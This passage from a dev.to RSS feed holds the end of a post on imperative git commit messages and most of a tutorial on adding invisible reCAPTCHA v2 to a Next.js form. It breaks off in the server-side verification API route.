  How do I write these correctly?
&lt;/h3&gt;

&lt;p&gt;Chris Beams gives a fantastic sentence to test your commits against. If the sentence still makes sense afterwards, then it is a strong imperative commit.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;If applied, this commit will &lt;strong&gt;&lt;em&gt;your message here&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code&gt;git commit -m "If applied, this commit will Change headline color"&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;vs.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;git commit -m "If applied, this commit will changes new color"&lt;/code&gt;&lt;/p&gt;




&lt;p&gt;I highly encourage you to &lt;a href="https://chris.beams.io/posts/git-commit/"&gt;read the full article&lt;/a&gt;, as there are many more great tips in there. &lt;/p&gt;

</description>
      <category>productivity</category>
      <category>todayilearned</category>
      <category>github</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Integrating reCAPTCHA with Next.js</title>
      <author>Prateek Surana</author>
      <pubDate>Mon, 18 Jan 2021 13:49:55 +0000</pubDate>
      <link>https://dev.to/prateek3255/integrating-recaptcha-with-next-js-53ng</link>
      <guid>https://dev.to/prateek3255/integrating-recaptcha-with-next-js-53ng</guid>
      <description>&lt;p&gt;In this post on integrating reCAPTCHA with Next.js, we will be looking at what is a CAPTCHA, how does it work and why you might need it. Then we'll work on a demo to illustrate how you can take advantage of Next.js features to integrate it nicely with your website.&lt;/p&gt;

&lt;p&gt;So you must've probably seen this before, but have you ever wondered what it does?&lt;/p&gt;

&lt;p&gt;
  &lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--cqIffkZU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://prateeksurana.me/blog/img/captcha-intro.jpg%3Fv%3D1234" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--cqIffkZU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://prateeksurana.me/blog/img/captcha-intro.jpg%3Fv%3D1234" alt="A regular reCAPTCHA"&gt;&lt;/a&gt;
&lt;/p&gt;

&lt;p&gt;A CAPTCHA is a &lt;a href="https://en.wikipedia.org/wiki/Turing_test"&gt;Turing test&lt;/a&gt; designed to tell humans and bots apart and is generally used by websites to prevent spam and abuse. It uses a challenge that is easy for humans but hard for bots. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.google.com/recaptcha/about/"&gt;reCAPTCHA&lt;/a&gt; is a CAPTCHA system currently being maintained by Google. The currently maintained versions are v2, which uses an analysis of cookies, canvas rendering, and user behavior to decide whether to show a challenge or not, and v3, which does not interrupt the users at all.&lt;/p&gt;

&lt;p&gt;To get the full benefits of reCAPTCHA, you need to verify the captcha response code in the server to verify its validity. With Next.js, this could have never been easier since it easily lets you spin up a serverless function (if you're deploying it via Vercel) just by adding an &lt;a href="https://nextjs.org/docs/api-routes/introduction"&gt;API route in the &lt;code&gt;/pages/api/&lt;/code&gt; folder&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;This post assumes you are familiar with the basics of React and Next.js. If not, I would recommend checking out the &lt;a href="https://reactjs.org/tutorial/tutorial.html"&gt;Intro to React Tutorial by the React team&lt;/a&gt; and the &lt;a href="https://nextjs.org/learn/basics/create-nextjs-app"&gt;Next.js tutorial from the docs&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;reCAPTCHA, though more famous than any other solutions out there but is &lt;a href="https://www.fastcompany.com/90369697/googles-new-recaptcha-has-a-dark-side"&gt;infamous for its privacy-related concerns&lt;/a&gt;. So if you are concerned about your user's privacy, we will also be looking at a privacy-friendly alternative to reCAPTCHA called &lt;a href="https://hcaptcha.com"&gt;hCaptcha&lt;/a&gt; later in this post.&lt;/p&gt;

&lt;p&gt;We will cover this with the following steps -&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href="#why-you-might-need-recaptcha-and-how-does-it-work"&gt;Why you might need to use reCAPTCHA and how does it work&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#setting-up-the-project"&gt;Setting up the project&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#adding-recaptcha-to-the-frontend"&gt;Adding reCAPTCHA to the frontend&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#verifying-recaptcha-via-nextjs-api-routes"&gt;Verifying captcha via Next.js' API routes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#integrating-hcaptcha-and-why-you-need-it"&gt;Bonus: Integrating hCaptcha and why you might need it&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id="why-you-might-need-recaptcha-and-how-does-it-work"&gt;Why you need to use reCAPTCHA and how does it work&lt;/h2&gt;

&lt;p&gt;Before we dive into integrating reCAPTCHA, let's take a moment to understand why you need it and how does it solve your problems.&lt;/p&gt;

&lt;p&gt;If you have a public-facing page with a form that sends the data to your backend server, then adding reCAPTCHA can help you to prevent spammers/bots from flooding your form and thus polluting your database or prevent something like brute force password guessing attack on a login page. Although reCAPTCHA is not the only way to prevent such malicious requests, there are other ways you can &lt;a href="https://elasticemail.com/blog/marketing_tips/how-to-prevent-bots-from-spamming-your-sign-up-forms"&gt;prevent spam without disturbing your users&lt;/a&gt;. Still, reCAPTCHA is really smart and only shows a challenge if your user fails its cookie and behavior analysis.&lt;/p&gt;

&lt;p&gt;The way it works is as soon as the user submits the form, you execute the reCAPTCHA instead of sending the data directly to your backend. In turn, reCAPTCHA provides you a callback for both success and failure, which will be executed if the user passes or fails the reCAPTCHA, respectively.&lt;/p&gt;

&lt;p&gt;Now this will prevent your frontend from malicious attacks. However, your backend APIs might still be insecure (assuming you are not using any other kind of protection, e.g., &lt;a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"&gt;CSRF tokens&lt;/a&gt;) because anyone can open the network tab to check the APIs getting pinged and run a script to ping the API with spam data. Thankfully reCAPTCHA provides a solution for that as well. When a user successfully clears the reCAPTCHA, you are provided with a token that is valid for 2 minutes. You can now validate this token in your backend with a secret key to verify the request's authenticity.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--BdRU1jn0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://prateeksurana.me/blog/img/recaptcha-working.png" class="article-body-image-wrapper"&gt;&lt;img class="article-img" src="https://res.cloudinary.com/practicaldev/image/fetch/s--BdRU1jn0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://prateeksurana.me/blog/img/recaptcha-working.png" alt="Working of reCAPTCHA"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id="setting-up-the-project"&gt;Setting up the project&lt;/h2&gt;

&lt;p&gt;I will be using a plain starter built using &lt;a href="https://www.npmjs.com/package/create-next-app"&gt;&lt;code&gt;create-next-app&lt;/code&gt;&lt;/a&gt; with a simple form. If you want to follow along, you can get the initial state from &lt;a href="https://github.com/prateek3255/recaptch-with-next/tree/4be05a0163a2629b88b6bf8dc6863c9bb29da2a2"&gt;this commit&lt;/a&gt;. The initial setup looks like this, and it just shows your email in an alert when you click on register&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--mUNUq7N4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://prateeksurana.me/blog/img/initial-recaptcha-app.jpg" class="article-body-image-wrapper"&gt;&lt;img class="article-img" src="https://res.cloudinary.com/practicaldev/image/fetch/s--mUNUq7N4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://prateeksurana.me/blog/img/initial-recaptcha-app.jpg" alt="Inital Next.js app"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let's register a new project on reCAPTCHA and get the required keys. For that, you can go to the &lt;a href="https://www.google.com/recaptcha/admin/create"&gt;reCAPTCHA admin console&lt;/a&gt;, fill in the required details as mentioned below, and click on submit.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;For this post's scope, we will be focusing on the &lt;a href="https://developers.google.com/recaptcha/docs/versions#recaptcha_v2_invisible_recaptcha_badge"&gt;v2 Invisible reCAPTCHA&lt;/a&gt; which does not involves the reCAPTCHA checkbox. It invokes the prompt to solve captcha for most suspicious traffic via a JavaScript API call and will directly tell us if the user has passed or not. &lt;/p&gt;

&lt;p&gt;v3 reCAPTCHA, though, is more advanced and doesn't require users to solve any challenge, but only provides a score between 0 and 1, requiring you to take action in the context of your site: for instance, requiring additional factors of authentication, sending a post to moderation, or throttling bots that may be scraping content.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--yhlFPsof--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://prateeksurana.me/blog/img/recaptcha-registration.jpg" class="article-body-image-wrapper"&gt;&lt;img class="article-img" src="https://res.cloudinary.com/practicaldev/image/fetch/s--yhlFPsof--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://prateeksurana.me/blog/img/recaptcha-registration.jpg" alt="Registering your reCAPTCHA site"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Notice how I added the only localhost to the list of domains. That's because we would only be using these keys for development purposes. reCAPTCHA also does a domain validation for the site it is being executed on, so we would be creating a separate set of keys for the production environment to only be used on the production domain and not be misused.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;After clicking submit, you should be able to see the public and secret keys. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Q1BJwA42--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://prateeksurana.me/blog/img/recaptcha-keys.png" class="article-body-image-wrapper"&gt;&lt;img class="article-img" src="https://res.cloudinary.com/practicaldev/image/fetch/s--Q1BJwA42--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://prateeksurana.me/blog/img/recaptcha-keys.png" alt="reCAPTCHA keys"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;To have separate keys for production and development environments and avoid pushing these keys to version control, we would store these keys in the environment variables. Unlike typical react app setups where you would need to manually &lt;a href="https://prateeksurana.me/blog/using-environment-variables-with-webpack/"&gt;setup environment variables manually via Webpack plugins&lt;/a&gt;, Next.js comes with &lt;a href="https://nextjs.org/docs/basic-features/environment-variables"&gt;built-in support for environment variables&lt;/a&gt;. For the development environment, create a file called &lt;code&gt;.env.local&lt;/code&gt; and add the following to it, and paste the keys you copied from the reCAPTCHA dashboard here appropriately.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Add the public site key here&lt;/span&gt;
&lt;span class="nv"&gt;NEXT_PUBLIC_RECAPTCHA_SITE_KEY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;
&lt;span class="c"&gt;# Add the secret key here&lt;/span&gt;
&lt;span class="nv"&gt;RECAPTCHA_SECRET_KEY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;You can use different environment keys for production with the proper domains added, either using &lt;code&gt;.env.production.local&lt;/code&gt; or adding the production environment variables to the tool (e.g., Vercel) you are using to deploy your app.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://github.com/prateek3255/recaptch-with-next/tree/4be05a0163a2629b88b6bf8dc6863c9bb29da2a2"&gt;👨🏻‍💻 Code till this step&lt;/a&gt;&lt;/p&gt;

&lt;h2 id="adding-recaptcha-to-the-frontend"&gt;Adding reCAPTCHA to the frontend&lt;/h2&gt;

&lt;p&gt;We need the public site key to be available to the client. Adding the &lt;code&gt;NEXT_PUBLIC_&lt;/code&gt; suffix to the environment variable would &lt;a href="https://nextjs.org/docs/basic-features/environment-variables#exposing-environment-variables-to-the-browser"&gt;make it visible to the browser&lt;/a&gt;. The &lt;code&gt;RECAPTCHA_SECRET_KEY&lt;/code&gt; environment variable would only be available on the server.&lt;/p&gt;

&lt;p&gt;We would be using a library called &lt;a href="https://github.com/dozoisch/react-google-recaptcha"&gt;&lt;code&gt;react-google-recaptcha&lt;/code&gt;&lt;/a&gt;, a wrapper around reCAPTCHA v2 that provides access to its APIs via a React component. Let's install it -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;yarn add react-google-recaptcha
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Since we are using the v2 invisible reCAPTCHA, we would be executing it when we submit the form via a &lt;a href="https://reactjs.org/docs/hooks-reference.html#useref"&gt;React ref&lt;/a&gt;. Import the ReCAPTCHA component and place it in the &lt;code&gt;pages/index.js&lt;/code&gt; file, like this -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;React&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;Head&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;next/head&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;ReCAPTCHA&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react-google-recaptcha&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Home&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;email&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setEmail&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;React&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;useState&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;recaptchaRef&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;React&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createRef&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;form&lt;/span&gt; &lt;span class="nx"&gt;onSubmit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;handleSubmit&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
      &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;ReCAPTCHA&lt;/span&gt;
        &lt;span class="na"&gt;ref&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;recaptchaRef&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
        &lt;span class="na"&gt;size&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"invisible"&lt;/span&gt;
        &lt;span class="na"&gt;sitekey&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;env&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;NEXT_PUBLIC_RECAPTCHA_SITE_KEY&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
      &lt;span class="na"&gt;onChange&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;onReCAPTCHAChange&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
      &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
      &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt;
        &lt;span class="na"&gt;onChange&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;handleChange&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
        &lt;span class="na"&gt;required&lt;/span&gt;
        &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"email"&lt;/span&gt;
        &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"email"&lt;/span&gt;
        &lt;span class="na"&gt;placeholder&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"Email"&lt;/span&gt;
      &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
      &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;button&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"submit"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Register&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;button&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="na"&gt;form&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
 .
 .
 );
}
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;For the &lt;code&gt;siteKey&lt;/code&gt; we are using the environment variable that we created in the last step.&lt;/p&gt;

&lt;p&gt;We now need to execute the reCAPTCHA when submitting the form and do what we want when our form is submitted in the &lt;code&gt;ReCAPTCHA&lt;/code&gt; component's &lt;code&gt;onChange&lt;/code&gt; handler when the captcha is completed. So let's modify the &lt;code&gt;handleSubmit&lt;/code&gt; function and define the &lt;code&gt;onReCAPTCHAChange&lt;/code&gt; function accordingly in our component -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;handleSubmit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;event&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;event&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;preventDefault&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="c1"&gt;// Execute the reCAPTCHA when the form is submitted&lt;/span&gt;
  &lt;span class="nx"&gt;recaptchaRef&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;current&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;onReCAPTCHAChange&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;captchaCode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c1"&gt;// If the reCAPTCHA code is null or undefined indicating that&lt;/span&gt;
  &lt;span class="c1"&gt;// the reCAPTCHA was expired then return early&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;captchaCode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="c1"&gt;// Else reCAPTCHA was executed successfully so proceed with the &lt;/span&gt;
  &lt;span class="c1"&gt;// alert&lt;/span&gt;
  &lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;`Hey, &lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;email&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="c1"&gt;// Reset the reCAPTCHA so that it can be executed again if user &lt;/span&gt;
  &lt;span class="c1"&gt;// submits another email.&lt;/span&gt;
  &lt;span class="nx"&gt;recaptchaRef&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;current&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;reset&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;When you restart the server with &lt;code&gt;yarn dev&lt;/code&gt;, if the integration was successful you should see the reCAPTCHA badge at the bottom right corner. And you would be only able to see the alert if you pass the reCAPTCHA.&lt;/p&gt;

&lt;p&gt;Note that if a challenge is not being shown to you, it doesn't necessarily mean that there is something wrong with the integration. As I mentioned earlier, reCAPTCHA only shows a challenge if you fail its behavior or cookie analysis.  If you still want to see the challenge anyways, you can open the tab in incognito and update the security preference to most secure from the reCAPTCHA admin dashboard.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8R8-CaV---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://prateeksurana.me/blog/img/recaptcha-security-preference.jpg" class="article-body-image-wrapper"&gt;&lt;img class="article-img" src="https://res.cloudinary.com/practicaldev/image/fetch/s--8R8-CaV---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://prateeksurana.me/blog/img/recaptcha-security-preference.jpg" alt="reCAPTCHA security preference"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You should be able to see the challenge after submitting a form couple of times in a row.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--SEAjPqPK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://prateeksurana.me/blog/img/recaptcha-in-action.gif" class="article-body-image-wrapper"&gt;&lt;img class="article-img" src="https://res.cloudinary.com/practicaldev/image/fetch/s--SEAjPqPK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://prateeksurana.me/blog/img/recaptcha-in-action.gif" alt="reCAPTCHA in action"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://github.com/prateek3255/recaptch-with-next/tree/14f229c3a9567938c2be1181517c48b29fc101cc"&gt;👨🏻‍💻 Code till this step&lt;/a&gt;&lt;/p&gt;

&lt;h2 id="verifying-recaptcha-via-nextjs-api-routes"&gt;Verifying captcha via Next.js' API routes&lt;/h2&gt;

&lt;p&gt;Likely, you don't want to show your user's info in an alert box when he submits your form. You might want to store that info somewhere in your backend instead or provide an appropriate response to the user in case of a login form. For that, we can replace the code that shows the alert with an API call that saves the info the user entered to your backend because we have already added the reCAPTCHA that would prevent any bot or spammers, right?&lt;/p&gt;

&lt;p&gt;Well, not really. As I mentioned in the beginning if you're not using any protection for your API and since the API is most probably open, someone can still run a simple script that continuously pings your API with garbage data polluting your database.&lt;/p&gt;

&lt;p&gt;Don't worry Next.js and reCAPTCHA have you covered.&lt;/p&gt;

&lt;p&gt;Remember the reCAPTCHA token you received in the &lt;code&gt;onReCAPTCHAChange&lt;/code&gt; function. That token can be used to verify whether the request you just received is legitimate or not. Google provides an &lt;a href="https://developers.google.com/recaptcha/docs/verify"&gt;API for verifying that token&lt;/a&gt; in your server via the secret key. The token is valid only for 2 minutes and can only be verified once to prevent any replay attacks.&lt;/p&gt;

&lt;p&gt;So do you need to update your API route that saves the user details or create a new server that would handle the verification if you're relying on some third party API? &lt;/p&gt;

&lt;p&gt;This is where &lt;a href="https://nextjs.org/docs/api-routes/introduction"&gt;Next.js' API routes&lt;/a&gt; come in. If you're using Vercel for deployment, it spins up a serverless function whenever you create a new API route.&lt;/p&gt;

&lt;p&gt;For our demo, we need an API endpoint that accepts the email and the captcha token and saves the email to the database if the token is valid, and returns an error if it is bogus.&lt;/p&gt;

&lt;p&gt;Let's create our API route, create a file called &lt;code&gt;pages/api/register.js&lt;/code&gt; and paste the following in it -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="c1"&gt;// pages/api/register.js&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;fetch&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;node-fetch&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;sleep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;resolve&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;resolve&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="mi"&gt;350&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;

